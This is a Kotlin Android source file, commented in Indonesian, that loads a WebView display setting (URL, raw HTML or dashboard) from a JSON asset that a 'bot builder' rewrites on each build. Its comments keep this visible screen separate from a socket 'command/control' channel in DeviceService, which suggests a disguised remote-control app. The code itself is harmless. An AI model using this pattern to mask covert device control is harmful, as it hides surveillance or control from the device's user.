package com.sync.xxx

import android.content.Context
import org.json.JSONObject

/**
 * Isi layar yang dilihat user. Dibaca dari assets/webview.json, dan file itu ditulis ulang
 * otomatis oleh bot builder setiap kali build.
 *
 * mode:
 *   "url"       buka halaman web biasa (default https://google.com)
 *   "html"      render kode HTML mentah yang dikirim saat build
 *   "dashboard" perilaku lama, buka dashboard controller di DeviceService.SERVER_URL
 *
 * Catatan penting: file ini TIDAK ada hubungannya dengan endpoint socket. SERVER_URL di
 * DeviceService tetap jadi jalur perintah/kontrol. webview.json cuma nentuin tampilan.
 */
object WebViewConfig {

    const val MODE_URL       = "url"
    const val MODE_HTML      = "html"
    const val MODE_DASHBOARD = "dashboard"

    const val DEFAULT_URL = "https://google.com"

    data class Config(
        val mode: String,
        val url: String,
        val html: String,
        val baseUrl: String
    )

    fun load(ctx: Context): Config = try {
        val raw  = ctx.assets.open("webview.json").bufferedReader().use { it.readText() }
        val json = JSONObject(raw)
        Config(
            mode    = json.optString("mode", MODE_URL).trim().lowercase(),
            url     = json.optString("url", DEFAULT_URL).trim(),
            html    = json.optString("html", ""),
            baseUrl = json.optString("baseUrl", "").trim()
        )
    } catch (e: Exception) {
        // Asset hilang atau JSON rusak — tetap tampilkan sesuatu, jangan blank.
        android.util.Log.e("WebViewConfig", "gagal baca webview.json: ${e.message}")
        Config(MODE_URL, DEFAULT_URL, "", "")
    }
}
